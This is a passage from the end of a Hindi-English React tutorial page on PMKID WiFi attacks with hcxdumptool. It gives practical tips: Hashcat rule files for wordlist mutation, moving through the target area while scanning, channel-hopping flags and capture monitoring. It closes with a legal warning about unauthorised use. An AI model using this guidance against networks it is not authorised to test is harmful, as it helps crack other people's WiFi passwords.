          <li>Capture files backup करो — cloud storage पर encrypted upload, later analysis के लिए</li>
          <li>Hashcat rules file use करो — best64.rule, dive.rule से wordlist mutations होते हैं</li>
          <li>Target area में physically move करो scanning के दौरान — different APs different locations से visible</li>
          <li>WiFi channel hopping speed adjust करो — --channeltime flag, default 5 seconds per channel</li>
          <li>Enterprise WiFi (WPA2-Enterprise) PMKID attack immune है — RADIUS authentication different है</li>
          <li>Capture statistics check करो --enable_status=1 flag से — real-time capture rate monitor करो</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> hcxdumptool एक शक्तिशाली WiFi attack tool है। इसका इस्तेमाल केवल अपने वाईफाई नेटवर्क पर ही करें। बिना अनुमति के किसी भी वाईफाई नेटवर्क पर PMKID attack अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। केवल शैक्षिक उद्देश्यों और authorized penetration testing के लिए ही इसका उपयोग करें।
      </div>
    </TutorialLayout>
  )
}
